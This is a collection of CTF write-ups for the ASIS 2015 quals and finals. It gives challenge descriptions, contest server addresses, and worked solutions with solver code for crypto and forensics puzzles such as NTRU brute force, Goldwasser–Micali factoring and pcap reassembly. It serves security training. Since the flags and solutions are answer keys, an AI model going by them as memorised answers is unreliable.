* <https://github.com/p4-team/ctf/tree/master/2015-10-10-asisfin/pwn_100_shop_1#eng-version>
* [Japanese](https://193s.github.io/blog/2015/10/13/asis-ctf-finals-2015-writeup/)
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/10/14/235444)
# ASIS Cyber Security Contest 2015: shop-2

**Category:** pwn
**Points:** 300
**Solves:** 19
**Description:**

> Our marvelous Bragisdumus shop just opened. Come and see our beautiful Bragisdumus!
> 
> Get a shell!
> 
> nc 185.106.120.220 1337

## Write-up

(TODO)

## Other write-ups and resources

* <https://kt.pe/blog/2015/10/asis-2015-finals-shop-2/>
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/10/14/235444)
# ASIS Cyber Security Contest 2015: sniff3r

**Category:** pwn
**Points:** 200
**Solves:** 3
**Description:**

> Honestly We need your help to get around something, we saw some suspicious activity in our network, we investigated and noticed that someone is sniffing our network.
> 
> After that he proved that by threating us. Based on our analysis, behavior of the program he is using is exactly similar to this one.
> 
> Please try to get access to his computer so we can avoid any further damages.
> 
> It seems connecting to 185.82.202.66:2222 starts the session, this is one of our servers.

## Write-up

(TODO)

## Other write-ups and resources

* https://kt.pe/blog/2015/10/asis-2015-finals-sniff3r/
# ASIS Cyber Security Contest CTF write-ups

* <http://asis-ctf.ir/>
* [Scoreboard](http://asis-ctf.ir/scoreboard/) or [local alternative](./scoreboard)

## Completed write-ups

* [forensic/big-lie](forensic/big-lie)
* [forensic/particles](forensic/particles)

## External write-ups only

* [crypto/10-sed](crypto/10-sed)
* [crypto/bodu](crypto/bodu)
* [crypto/giloph](crypto/giloph)
* [crypto/honeywall](crypto/honeywall)
* [crypto/RSASR](crypto/RSASR)
* [crypto/simple](crypto/simple)
* [forensic/MBTI](forensic/MBTI)
* [forensic/strange](forensic/strange)
* [misc/flag-hunter](misc/flag-hunter)
* [misc/meow-meow](misc/meow-meow)
* [pwn/calcexec-1](pwn/calcexec-1)
* [pwn/calcexec-2](pwn/calcexec-2)
* [pwn/png2ppm](pwn/png2ppm)
* [pwn/shop-1](pwn/shop-1)
* [pwn/shop-2](pwn/shop-2)
* [pwn/sniff3r](pwn/sniff3r)
* [reverse/asis-hash](reverse/asis-hash)
* [reverse/exchange](reverse/exchange)
* [reverse/fake](reverse/fake)
* [reverse/license](reverse/license)
* [trivia/calm-down](trivia/calm-down)
* [trivia/example-flag](trivia/example-flag)
* [web/impossible](web/impossible)
* [web/myblog](web/myblog)
* [web/ultra-compression](web/ultra-compression)

## Missing write-ups

* [crypto/the-last-survivor](crypto/the-last-survivor)
* [forensic/iosdump](forensic/iosdump)
* [misc/missing-rings](misc/missing-rings)
* [reverse/brain](reverse/brain)
* [reverse/gasis](reverse/gasis)# ASIS Cyber Security Contest 2015: asis-hash

**Category:** reverse
**Points:** 150
**Solves:** 43
**Description:**

> Find the flag in this file.

## Write-up

(TODO)

## Other write-ups and resources

* https://kt.pe/blog/2015/10/asis-2015-finals-asishash/
# ASIS Cyber Security Contest 2015: brain

**Category:** reverse
**Points:** 250
**Solves:** 2
**Description:**

> Find the flag in this file.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest 2015: exchange

**Category:** reverse
**Points:** 200
**Solves:** 7
**Description:**

> Find the flag in this file.

## Write-up

(TODO)

## Other write-ups and resources

* https://kt.pe/blog/2015/10/asis-2015-finals-exchange/
# ASIS Cyber Security Contest 2015: fake

**Category:** reverse
**Points:** 150
**Solves:** 45
**Description:**

> Find the flag in this file.

## Write-up

(TODO)

## Other write-ups and resources

* https://kt.pe/blog/2015/10/asis-2015-finals-fake/
# ASIS Cyber Security Contest 2015: gasis

**Category:** reverse
**Points:** 200
**Solves:** 0
**Description:**

> Find 3 last "total lunar eclipse" related verification code that happened in Tehran.
> 
> C1 = verification_code@tehran_last_total_lunar_eclipse
> 
> C2 = verification_code@tehran_second_last_total_lunar_eclipse
> 
> C3 = verification_code@tehran_third_last_total_lunar_eclipse
> 
> Flag = ASIS{md5(concat(c1, c2, c3 )}

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest 2015: license

**Category:** reverse
**Points:** 125
**Solves:** 85
**Description:**

> Find the flag in this file.

## Write-up

(TODO)

## Other write-ups and resources

* https://kt.pe/blog/2015/10/asis-2015-finals-license/
# ASIS Cyber Security Contest 2015: calm-down

**Category:** trivia
**Points:** 75
**Solves:** 89
**Description:**

> Which one is flag ?

## Write-up

(TODO)

## Other write-ups and resources

* https://kt.pe/blog/2015/10/asis-2015-finals-calmdown/
# ASIS Cyber Security Contest 2015: example-flag

**Category:** trivia
**Points:** 1
**Solves:** 97
**Description:**

> Confessions of a flag...

## Write-up

(TODO)

## Other write-ups and resources

* https://kt.pe/blog/2015/10/asis-2015-finals-example-flag/
# ASIS Cyber Security Contest 2015: impossible

**Category:** web
**Points:** 225
**Solves:** 28
**Description:**

> Go there(http://impossible.asis-ctf.ir/) and find the flag.

## Write-up

(TODO)

## Other write-ups and resources

* <https://kt.pe/blog/2015/10/asis-2015-finals-impossible/>
* <http://khack40.info/asis-final-ctf-2015-impossible-web-write-up/> (French)
# ASIS Cyber Security Contest 2015: myblog

**Category:** web
**Points:** 150
**Solves:** 30
**Description:**

> Go there(http://myblog.asis-ctf.ir:8088/) and find the flag.
> 

## Write-up

(TODO)

## Other write-ups and resources

* https://kt.pe/blog/2015/10/asis-2015-finals-myblog/
# ASIS Cyber Security Contest 2015: ultra-compression

**Category:** web
**Points:** 125
**Solves:** 13
**Description:**

> Go there (http://ucs.asis-ctf.ir/) and find the flag.
> 

## Write-up

(TODO)

## Other write-ups and resources

* https://kt.pe/blog/2015/10/asis-2015-finals-ultra-compression/
# ASIS Quals CTF 2015: Angler

**Category:** Crypto
**Points:** 150
**Solves:** 22
**Description:**

> Connect there and find the flag.
> 
> nc 217.218.48.84 34211
> 
> mirror 1 : nc 217.218.48.84 34213
> 
> mirror 2 : nc 217.218.48.84 34215
> 
> mirror 3 : nc 217.218.48.84 34210

## Write-up

by [DerBaer0](https://github.com/DerBaer0)

**Observing**
When we connect, the server asks for the solution of a simple addition
> Welcone to AngriCrypt challange :)
>
> Bot detection: Are you ready?
>
> 2 + 25 = 

After solving this, we get an encrypted message and the possibility to en/decryt our own messages:
> Encrypted message is: shaTetfirpr  a stog fli:f 0A9 SeS{0eeI6e5o14n Whsm, i  ebnesssclgym oeoto ,d ur  onit detovyerhm awaho tngsuhkthaes lheense. Tscs tn od parff o a6lgais:8a e7c77ce607c363_c_52_}
>
> ___d_
> Tell us your choice:
>
> [E]ncrypt: [D]ecrypt:

Both, E and D will ask for a message and a key. We can use this to find out, how the algorithm works. After this, we can try to decrypt the server's message manually. This weird string already looks a bit like a flag ('{', '}', ASIS-letters), but it looks a bit scrambled up.
After playing around a bit with different trivial messages and keys, I tried:

message: "abcdefghijklmnopqrstuvwxyz"

key: "aud"

Which gives the ciphertext: "acbdfegihjlkmonprqsutvxwy_z"
Here we can see: always 3 characters form one 'block' and are mixed up with the same algorithm:
the first character stays at his position, the other two change position. If you take a look at the key:
If we order the letters in alphabetic order ("adu") and apply the exakt same reordering as in the message, we get the key. The '_' seems to be a padding character to make the message dividable by 3.

**Cracking**
So, we have to find a permutation P of length L that will reorganize the letters in the given message to form a valid flag.
There are a lot of possibilities, but we can use some hints:
* The total message is 182 bytes long and we know L divides the message length. So L is on of: 1, 2, 7, 13, 14, 26, 91, 182. We have 7 '_'s, so the key has to be bigger. 13 (prime number) sounds like a reasonable possibility
* The padding bytes have to go to the end and I guessed the original message ended in "}\n"
This will give me the following permutation list:
[(1, 3, 4, 11), 6, 7, (0, 2, 5, 8, 9, 10, 12)]
Where the i'th number means, in the original message at position i is the character that is at P[i] in the ciphertext.
The 6 and 7 ('}' and '\n') are fixed. About the 4 values in the beginning and 7 in the end, we don't have any information yet, how to order them.
The following code transforms the string acording to the permutation.
```python
res = ""
for i in range(0, 182, len(perm)):
	for k in range(len(perm)):
		res += string[i + perm[k]]
	res += "|" # to show blocks
print(res)
```
This will give us:

*"hTe fisatrpr | tof fasgli: |A SIS{09e0ee6|514, Weonhsm | eblesi nsscg|moe toy o ,du| onot r idetv|ehm awyr ahot|guh thnskaesl|enss. heeTsc |nod pat  rffo|alg is 6a:8ae|c7c66077e7c33|c52d}#_______|"*

Let's fix the ASIS (swap first and second bytes. 3rd and 4th are in correct order already)

[3, 1, 4, 11, 6, 7, (0, 2, 5, 8, 9, 10, 12)]

*"The fisatrpr |t of fasgli: | ASIS{09e0ee6|154, Weonhsm |e blesi nsscg|ome toy o ,du|o not r idetv|hem awyr ahot|ugh thnskaesl|ness. heeTsc |ond pat  rffo|lag is 6a:8ae|7cc66077e7c33|5c2d}#_______|"*

Now, we can bruteforce the remaining 7! = 5040 possibilities, or we just guess the beginning text:
"The first part of flag:"

This leads us to the (final) permutation of

[3, 1, 4, 11, 6, 7, 8, 0, 5, 12, 9, 2, 10]

And the decrypted message:

*The first part of flag is: ASIS{00e6e9e154, When some blessings come to you, do not drive them away through thanklessness. The second part of flag is: ae86a7cc66077e3c735c2d}#_______*

And so the flag is: ASIS{00e6e9e154ae86a7cc66077e3c735c2d}

So, as soon as you get the idea on how the algorithm works and how to get a few letters organized, it is solved in a short time.

## Other write-ups and resources

* none yet
# ASIS Quals CTF 2015: Cross Check

**Category:** Crypto
**Points:** 350
**Solves:** 20
**Description:**

> UPDATED
>
> The flag is encrypted by this [code](http://tasks.asis-ctf.ir/cross_check_updated_617649d4300c2de16b436eca3ca5fb8a), can you decrypt it?

## Write-up

(TODO)

## Other write-ups and resources

* [b01lers](https://b01lers.net/challenges/ASIS%202015/Cross%20Check/52/)
# ASIS Quals CTF 2015: FalseCrypt

**Category:** Crypto
**Points:** 450
**Solves:** 3
**Description:**

> Connect there: 
>
> nc 217.218.48.84 12431

## Write-up

by [DerBaer0](https://github.com/DerBaer0)

Ok, let's see what to do with the challange with the most points in this contest. It took me a long time to understand, how this is working and again a lot of time to get the output correct. However, solving was quite easy.

**First step**
> A Cryptosystems that uses public-key cryptography, as it is very small could be use for embeded systems as

> well as for servers and so on. It's been said that it's performance is much better than RSA and and can't 

> be broken by Shor's algorithm.

> What's the name of this cryptosystem?

This is how  you are welcomed on the server. So, we are looking for public-key cryptosystem that can't be broken by Shor's algorithm. Google knows the answer: NTRU

In Wikipedia: (http://en.wikipedia.org/wiki/NTRUEncrypt)

Math on polynoms: (https://www.securityinnovation.com/uploads/Crypto/NTRU%20Algebra%20Tutorial.pdf)

With a good example: (http://people.scs.carleton.ca/~maheshwa/courses/4109/Seminar11/NTRU_presentation.pdf)

Never heard about it. I was looking a long time to find good explanations. The Math was helpful to know, how to code the functions and the 3rd link had some examples to test everything.

Ok, let's see what we have to do.

**Encryption**
After the first question, we have to crack the NTRU cryptography (correct and fast, as always):
> pubkey:

> (5, 3, 16, 10*x^4 + 4*x^3 + 6*x^2 + 11*x + 14)

> enc: 15*x + 15

The public key is (N, p, q, h), the ciphertext (enc) e

| Variable | Explanation |
|----------|----------------|
| N | Integer, Modulus for exponent |
| p | Integer(small), Modulus for coefficients |
| q | Integer(large), Modulus for coefficients |
| h | Polynom |
| e | Polynom, ciphertext |

So, how does NTRU encryption work?
* Choose random polynom r with coefficients from (0, 1, -1)
* Convert message to polynom m with coefficients from (0, 1, -1) (Though the solution in the challange was the the polynom itself.)
* e = r * h + m (mod q)

We can crack the polynom h to be able to calculate the private key and than decrypt the whole message. But I didn't understand how this works and it looked like a lot of work.

So, we have small values everywhere. Why not Brute-force the random r and the message m? Both r and m are polynoms with N coefficients from the values (0, 1, -1). So 3^10 = 59049 possibilites.

So, I implemented the polynom arithmetic, a parser for the polynoms(sig) and a recursive function to generate the r and m. Then I tried these values, took the solution and sent it back to the server. And after one hundred tries, I finally fixed all presentation bugs etc. and the server accepted my decrypted message.

But as usual, parameter sizes increased. I changed the hardcoded N, p and q to variable values and continue. After 2 or 3 stages, the polynom was too big to bruteforce.

**Optimization**
Bruteforcing 2 * N coefficients took too long time, so I optimized.

> e = r * h + m (mod q)

> e - r * h = m (mod q)
 
I know e, h and q.  So, I changed my algorithm to only brute-force r and then calculated mN. I just had to check, if m is a valid message polygon (coefficientes = 0, 1, -1). As a result, I only had N coefficientes to brute-force. Tis took some time, but was still fast enough.

After 4 levels, the server answered with:
ASIS{b8eaee716e1d7e29b88b31e84272c6c2}

Was easier than it looked liked. Just find the one important function in the whole process and mess around with polygon parsing / writing.

## Other write-ups and resources

* none yet
# ASIS Quals CTF 2015: Golden Metal

**Category:** Crypto
**Points:** 300
**Solves:** 21
**Description:**

> The flag is encrypted by this [code](http://tasks.asis-ctf.ir/golden_medal_bfbbc8cf9f1be465ccf2ff9bf17a64b2), can you decrypt it after finding the system?

## Write-up

by [elliptic-shiho](https://github.com/elliptic-shiho)

This challenge is [Goldwasser–Micali cryptosystem](http://en.wikipedia.org/wiki/Goldwasser%E2%80%93Micali_cryptosystem). so, this is a factoring challenge!
I've used the [msieve](http://sourceforge.net/projects/msieve/) to factorization.
```
Mon May 11 09:51:40 2015  Msieve v. 1.52 (SVN Unversioned directory)
Mon May 11 09:51:40 2015  random seeds: c17e5382 d4318f7e
Mon May 11 09:51:40 2015  factoring 1746706403628138819652874617603544146781763497759635411369593250306792101284958553453421021829757 (97 digits)
(snip)
Mon May 11 11:24:41 2015  prp49 factor: 1285380609783825451015579898011805465763518244839
Mon May 11 11:24:41 2015  prp49 factor: 1358902095093762824984385249873903079031552839163
Mon May 11 11:24:41 2015  elapsed time 01:32:47
```

`p , q = 1285380609783825451015579898011805465763518244839, 1358902095093762824984385249873903079031552839163`

Now, we can solve the challenge!

solver code is here:

```python
p = 1285380609783825451015579898011805465763518244839
q = 1358902095093762824984385249873903079031552839163

d = eval(open("enc.txt").read()[5:])
e = ((p-1)*(q-1)+4)/8

m = ""
for x in d:
  k = pow(x, e, p*q)
  if pow(k, 2, p*q) == x:
    m += "0"
  else:
    m += "1"


print m

print ("%x"%int(m, 2)).decode("hex")
```

written by [@elliptic_shiho](http://twitter.com/elliptic_shiho)

## Other write-ups and resources

* [b01lers](https://b01lers.net/challenges/ASIS%202015/Golden%20Metal/53/)
# ASIS Quals CTF 2015: Qrypt

**Category:** Crypto
**Points:** 200
**Solves:** 6
**Description:**

> The flag is encrypted by this [code](http://tasks.asis-ctf.ir/qrypt_f8e4c4e3b96070e0790f39d10cae63e3), can you decrypt it after finding the system?

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Quals CTF 2015: Simple Algorithm

**Category:** Crypto
**Points:** 100
**Solves:** 102
**Description:**

> The flag is encrypted by this [code](http://tasks.asis-ctf.ir/simple_algorithm_5a0058082857cf27d6e51c095ac59bd5), can you decrypt it after finding the system?

## Write-up

by [DerBaer0](https://github.com/DerBaer0)

We are given a long integer
> 2712733801194381163880124319146586498182192151917719248224681364019142438188097307292437016388011943193619457377217328473027324319178428

and a python code that converts a flag into an integer.

**Code**
My complete code can be found in simple_python.py

**Sidenote**: I don't need this, but who is interested:
FAN(n, m) interprets the binary representation of n as string of base m and returns the corresponding value with base 10. Example:
```
n = 6
m = 3
6 in binary is 101
FAN(6, 3) = 1 * 3^2 + 0 * 3^1 + 1 * 3^0 = 10
```
**Encryption**
The encryption algorith in Pseudocode is
```
Enc(flag):
encode flag as hex
convert large hex number to base 10
split it in parts of 2 digits
calculate for every part x the value FAN(x, 3) 
concatenate the values
```

**Idea**
The idea is to reverse the algorithm. Therefor we will:
Split the integer
Find corresponding x
concatenate the integer (base 10)
convert it to hex
end decode the flag

To find the x, I tried all possible values for x (0 .. 99). I precalculated the FAN(x, 3) values to save this time, but a reverse lookup table would be even faster ...

The biggest problem was finding the positions to split the integer. The FAN() values are 1 up to 4 digits long, so we don't know where to split. So I used Dynamic Programming to find all possibilities:
Let's say we have the following FAN() values:

| x | FAN(x, 3)|
| ----------|---|
| FAN(0, 3) | 17 |
| FAN(1, 3) | 1 |
| FAN(2, 3) | 76 |
| FAN(3, 3) | 6 |
and the integer 176.

At pos = 0, we can use the 17 or the 1. So, all posible options to generate 176 is, we use a 17 and than what we need from pos=2 until the end (only a 6 possible), or we use a 1 and what we need from pos=1 to the end. To calculate this, I started from the end of the integer going backwards and I always looked what i can match on the string. When I finally reached pos=0, I had a list of all possibilities to go from pos=0 to the end. These are 1105920 possibilities.
```python
arr = [FAN(i, 3) for i in range(100)]
for pos in range(len(str(s)) - 1, -1, -1):
    # [...] excluded some special cases
	for val in range(0, 100):
		if str(s)[pos:pos + len(str(arr[val]))] == str(arr[val]):
			possible[pos] += ['%02d|' % val + k for k in possible[pos + len(str(arr[val]))]]
```

After this, I reconstructed the flag and ignored all flags with non-printable bytes.
The result is the flag SIS{a9ab115c488a311896dac4e8bc20a6d7}. (I had to 'guess' the first letter, because the algorithm drops it)

Total runtime: 12 seconds

**Annotation**
With a different flag, the number of possibilities can maybe grow even more, and thus exceed memory limits. A solution is to split the long integer into 2 parts. Than calculated normally from the end until the middle and begin with only the '_' form the middle to the beginning. After this, you iterate over all possibilities in the first part and in the second part and concatenate them. This will dramatically reduce the number of stored values. I tried this, and it worked. However, I srun the program 4 times with different split positions: 70, 71, 72 and 73, because this ssplit position MUST be between to values.

## Other write-ups and resources

* <http://capturetheswag.blogspot.com.au/2015/05/asis-ctf-2015-simplealgorithm-100-point.html>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/ASISCTF/crypto/simplealgorithm>
* <https://b01lers.net/challenges/ASIS%202015/Simple%20Algorithm/50/>
* [Indonesian](https://github.com/rentjongteam/write-ups-2015/tree/master/asis-quals-2015/simple-algorithm)
# ASIS Quals CTF 2015: Broken Heart

**Category:** Forensic
**Points:** 100
**Solves:** 120
**Description:**

> Find the flag in this [file](http://tasks.asis-ctf.ir/myheart_7cb6daec0c45b566b9584f98642a7123).

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on these writeups:

* <http://www.thice.nl/asis-ctf-2015-write-ups/>
* <https://xmgv.wordpress.com/2015/05/11/asis-ctf-quals-2015-broken-heart/>
* <https://github.com/naijim/blog/blob/master/writeups/asis-quals-ctf-2015_broken_heart_writeup.md>

We are given a pcap-ng capture file:

```bash
$ file myheart_7cb6daec0c45b566b9584f98642a7123
myheart_7cb6daec0c45b566b9584f98642a7123: pcap-ng capture file - version 1.0
```

Looking at the type of network protocols used in the transmission, we see a bunch of mostly TCP, DNS and HTTP Requests:

```bash
$ tshark -r myheart_7cb6daec0c45b566b9584f98642a7123  | awk '{print $7}' | sort | uniq -c | sort -n
   1 BROWSER
   2 ARP
   7 DHCPv6
  30 HTTP
  92 DNS
3044 TCP
```

Looking at the HTTP requests, we see that a file named `LoiRLUoq` was requested and transmitted in several parts:

```bash
$ tshark -r myheart_7cb6daec0c45b566b9584f98642a7123 'http'
 11 2015-04-12 12:15:24.004110 192.168.221.128 -> 87.107.124.13 HTTP 226 GET /LoiRLUoq HTTP/1.1 
 85 2015-04-12 12:15:24.538424 87.107.124.13 -> 192.168.221.128 HTTP 10358 Continuation
192 2015-04-12 12:15:35.028034 192.168.221.128 -> 87.107.124.13 HTTP 225 GET /LoiRLUoq HTTP/1.1 
194 2015-04-12 12:15:35.088198 87.107.124.13 -> 192.168.221.128 HTTP 2630 HTTP/1.1 206 Partial Content  (application/octet-stream)
[...]
2890 2015-04-12 12:17:51.394972 192.168.221.128 -> 87.107.124.13 HTTP 224 GET /LoiRLUoq HTTP/1.1 
3060 2015-04-12 12:17:57.021329 192.168.221.128 -> 87.107.124.13 HTTP 226 GET /LoiRLUoq HTTP/1.1 
3062 2015-04-12 12:17:57.086697 87.107.124.13 -> 192.168.221.128 HTTP 4155 HTTP/1.1 206 Partial Content  (application/octet-stream)
```

From the `tshark` examination, it seems like the parts were transmitted from the ip `87.107.124.13` to `192.168.221.128`.

We can extract these parts using `tcpflow`:

```bash
$ tcpflow -r myheart_7cb6daec0c45b566b9584f98642a7123
$ ls -1
087.107.124.013.00080-192.168.221.128.54391
087.107.124.013.00080-192.168.221.128.54392
087.107.124.013.00080-192.168.221.128.54393
[...]
087.107.124.013.00080-192.168.221.128.54414
087.107.124.013.00080-192.168.221.128.54415
192.168.221.128.54391-087.107.124.013.00080
192.168.221.128.54392-087.107.124.013.00080
[...]
192.168.221.128.54414-087.107.124.013.00080
192.168.221.128.54415-087.107.124.013.00080
alerts.txt
myheart_7cb6daec0c45b566b9584f98642a7123
report.xml
```

Since we only need data transmitted from `87.107.124.13` to `192.168.221.128`, we only care about the files beginning with `087.107.124.013`.

We look at the `Content-Range` field of each HTTP Response to see how big the transmitted file is and which ranges have been submitted:

```bash
$ for i in 087.107.124.013.00080-192.168.221.128.54*; do strings -a "$i" | grep "Content-Range"; done | tr '/-' ' ' | sort -nk4
Content Range: bytes 13 179538 2347916
Content Range: bytes 27943 132132 2347916
Content Range: bytes 145550 198027 2347916
Content Range: bytes 188923 359924 2347916
Content Range: bytes 337541 500782 2347916
Content Range: bytes 467298 648929 2347916
Content Range: bytes 552789 781321 2347916
Content Range: bytes 694834 905770 2347916
Content Range: bytes 892465 1067354 2347916
Content Range: bytes 905781 1032111 2347916
Content Range: bytes 986065 1150874 2347916
Content Range: bytes 1080486 1345387 2347916
Content Range: bytes 1276598 1432659 2347916
Content Range: bytes 1397670 1593207 2347916
Content Range: bytes 1507903 1694032 2347916
Content Range: bytes 1540792 1639406 2347916
Content Range: bytes 1672374 1872648 2347916
Content Range: bytes 1774960 1959007 2347916
Content Range: bytes 1888311 1938509 2347916
Content Range: bytes 1904693 2059434 2347916
Content Range: bytes 1987909 2044321 2347916
Content Range: bytes 2001846 2202904 2347916
Content Range: bytes 2106781 2347915 2347916
```

Looks like everything - except the first 13 bytes - is available.

First we create a file of size `2347916` using `dd`:

```bash
$ dd if=/dev/zero of=tcpstream bs=2347916 count=1
1+0 records in
1+0 records out
2347916 bytes transferred in 0.001627 secs (1443123310 bytes/sec)
$ ls -alF tcpstream
-rw-r--r--  1 xxx xxx 2347916 Dec 22 22:13 tcpstream
```

Then, we write a small [python script](./reassembler.py) that reassembles the big file from the parts according to their content-ranges:

```bash
$ for i in 087.107.124.013.00080-192.168.221.128.54*; do python2.7 reassembler.py "$i" tcpstream; done
1080486 1345387 265284 382
986065 1150874 165191 381
1397670 1593207 195920 382
337541 500782 163622 380
2001846 2202904 201441 382
467298 648929 182012 380
1507903 1694032 186512 382
552789 781321 228913 380
1276598 1432659 156444 382
1888311 1938509 50580 381
13 179538 179902 376
2106781 2347915 241517 382
1540792 1639406 98996 381
145550 198027 52857 379
905781 1032111 126712 381
1987909 2044321 56794 381
694834 905770 211317 380
27943 132132 104569 379
1774960 1959007 184430 382
892465 1067354 175271 381
1904693 2059434 155124 382
188923 359924 171382 380
1672374 1872648 200657 382
$ md5 tcpstream
61f89707b9c9d2d2da88dfb9259dea56  tcpstream
```

We open the stream using a hexeditor (e.g. `hexedit`) to see that the transmitted file most likely is a PNG, since it contains chunk names such as `[I]HDR`, `pHYs` and `IDAT`:

![](./other-chunks.png)

![](./idat-chunk.png)

All that's left to do is to insert the missing first 13 bytes (also known as part of a `header`) of our PNG.

We can either look up any [PNG specification](http://www.w3.org/TR/PNG/#5DataRep) or open a valid PNG in `hexedit` to know what these first 13 bytes are:

![](png-header.png)

After inserting these bytes, we get the following picture containing our flag:

![](tcpstream.png)

Now, because we are super-cheeky, we can apply [OCR](https://en.wikipedia.org/wiki/Optical_character_recognition) to extract the flag automatically without writing it down by hand:

```bash
$ tesseract tcpstream.png ./out
[...]
$ cat out.txt
ASIS{8bffe21e084db147b32aa850bc65eb16}
```

The flag is `ASIS{8bffe21e084db147b32aa850bc65eb16}`.

PS: According to [this writeup](https://github.com/naijim/blog/blob/master/writeups/asis-quals-ctf-2015_broken_heart_writeup.md) there exists a program called `dshell` that does the parts reassembling job for us - haven't tried it out yet though.

## Other write-ups and resources

* <http://lockboxx.blogspot.com/2015/05/asis-ctf-2015-quals-writeup-broken-heart.html>
* <https://xmgv.wordpress.com/2015/05/11/asis-ctf-quals-2015-broken-heart/>
* <https://github.com/naijim/blog/blob/master/writeups/asis-quals-ctf-2015_broken_heart_writeup.md>
* <http://www.thice.nl/asis-ctf-2015-write-ups/>
* [Indonesian](https://github.com/rentjongteam/write-ups-2015/tree/master/asis-quals-2015/broken-heart)
# ASIS Quals CTF 2015: CheckMe

**Category:** Forensic
**Points:** 225
**Solves:** 0
**Description:**

> After checking [me](http://tasks.asis-ctf.ir/checkme_a96b6962b9793a2e3e88dcbed46b91ea) find the flag.
> 
> ATTENTION
> 
> be careful to use virtual machine, this might have some malicious files.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Quals CTF 2015: Dump

**Category:** Forensic
**Points:** 250
**Solves:** 16
**Description:**

> Where is flag in this [file](http://tasks.asis-ctf.ir/dump_afd637ec02406cd89caed36d74849cf1)?

[Alternative download](https://mega.nz/#!HMFBHRBR!g08oZoXkyqvB_NcJdpP4Rt36gp2Q3ug0ZXKJhVk-F1g)

## Write-up

(TODO)

## Other write-ups and resources

* <http://dakutenpura.hatenablog.com/entry/2015/05/12/004918>
* [Indonesian](https://github.com/rentjongteam/write-ups-2015/tree/master/asis-quals-2015/dump)
* [Vietnamese](https://babyphd.net/2015/05/asis-quals-ctf-2015-grids-writeup/)
# ASIS Quals CTF 2015: Keka Bomb

**Category:** Forensic
**Points:** 75
**Solves:** 49
**Description:**

> Find the flag in this [file](http://tasks.asis-ctf.ir/keka_bomb_9e0f1863259c578f3231b5cfbc10e258).

## Write-up

by [polym](https://github.com/abpolym)

We extract the given xz compressed file to find a 7-zip archive:

```bash
+bash-4.3$ file keka_bomb_9e0f1863259c578f3231b5cfbc10e258 
keka_bomb_9e0f1863259c578f3231b5cfbc10e258: xz compressed data
+bash-4.3$ mv keka_bomb_9e0f1863259c578f3231b5cfbc10e258{,.xz}
+bash-4.3$ unxz keka_bomb_9e0f1863259c578f3231b5cfbc10e258.xz 
+bash-4.3$ file keka_bomb_9e0f1863259c578f3231b5cfbc10e258
keka_bomb_9e0f1863259c578f3231b5cfbc10e258: 7-zip archive data, version 0.3
```

Inside the archive, we see a bunch of very big files named `001.7z` to `016.7z`:

```bash
+bash-4.3$ 7z l keka_bomb_9e0f1863259c578f3231b5cfbc10e258 

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)

Listing archive: keka_bomb_9e0f1863259c578f3231b5cfbc10e258

--
Path = keka_bomb_9e0f1863259c578f3231b5cfbc10e258
Type = 7z
Method = LZMA
Solid = -
Blocks = 16
Physical Size = 9508910
Headers Size = 210

   Date      Time    Attr         Size   Compressed  Name
   ------------------- ----- ------------ ------------  ------------------------
   2015-04-30 03:46:35 ....A   4194304000       594004  001.7z
   2015-04-30 03:46:35 ....A   4194304000       594004  002.7z
   2015-04-30 03:46:35 ....A   4194304000       594004  003.7z
   2015-04-30 03:46:35 ....A   4194304000       594004  004.7z
   2015-04-30 03:46:35 ....A   4194304000       594004  005.7z
   2015-04-30 03:46:35 ....A   4194304000       594004  006.7z
   2015-04-30 03:46:35 ....A   4194304000       594004  007.7z
   2015-04-30 03:46:35 ....A   4194304000       594004  008.7z
   2015-04-30 03:46:35 ....A   4194304000       594004  009.7z
   2015-04-30 03:46:35 ....A   4194304000       594004  010.7z
   2015-04-30 03:46:35 ....A   4194304000       594004  011.7z
   2015-04-30 03:46:35 ....A   4194304000       594004  012.7z
   2015-04-30 03:46:35 ....A   4194304000       598640  013.7z
   2015-04-30 03:46:35 ....A   4194304000       594004  014.7z
   2015-04-30 03:46:35 ....A   4194304000       594004  015.7z
   2015-04-30 03:46:35 ....A   4194304000       594004  016.7z
   ------------------- ----- ------------ ------------  ------------------------
                              67108864000      9508700  16 files, 0 folders
```

Unzipping this file right away looks like a trap - it is a bomb that explodes your hard drive space usage!

However, we see a file that differs in the CRC:

```bash
$ 7z -slt l keka_bomb_9e0f1863259c578f3231b5cfbc10e258.zip | tail -n+17 | sed ':a;N;$!ba;s/\n/ /g' | sed 's/  /\n/g' | sort -k20
Path = 013.7z Size = 4194304000 Packed Size = 598640 Modified = 2015-04-30 03:46:35 Attributes = ....A CRC = 36EB76E2 Encrypted = - Method = LZMA:24 Block = 12
Path = 001.7z Size = 4194304000 Packed Size = 594004 Modified = 2015-04-30 03:46:35 Attributes = ....A CRC = ED145EFF Encrypted = - Method = LZMA:24 Block = 0
Path = 002.7z Size = 4194304000 Packed Size = 594004 Modified = 2015-04-30 03:46:35 Attributes = ....A CRC = ED145EFF Encrypted = - Method = LZMA:24 Block = 1
Path = 011.7z Size = 4194304000 Packed Size = 594004 Modified = 2015-04-30 03:46:35 Attributes = ....A CRC = ED145EFF Encrypted = - Method = LZMA:24 Block = 10
Path = 012.7z Size = 4194304000 Packed Size = 594004 Modified = 2015-04-30 03:46:35 Attributes = ....A CRC = ED145EFF Encrypted = - Method = LZMA:24 Block = 11
Path = 014.7z Size = 4194304000 Packed Size = 594004 Modified = 2015-04-30 03:46:35 Attributes = ....A CRC = ED145EFF Encrypted = - Method = LZMA:24 Block = 13
Path = 015.7z Size = 4194304000 Packed Size = 594004 Modified = 2015-04-30 03:46:35 Attributes = ....A CRC = ED145EFF Encrypted = - Method = LZMA:24 Block = 14
Path = 016.7z Size = 4194304000 Packed Size = 594004 Modified = 2015-04-30 03:46:35 Attributes = ....A CRC = ED145EFF Encrypted = - Method = LZMA:24 Block = 15 
Path = 003.7z Size = 4194304000 Packed Size = 594004 Modified = 2015-04-30 03:46:35 Attributes = ....A CRC = ED145EFF Encrypted = - Method = LZMA:24 Block = 2
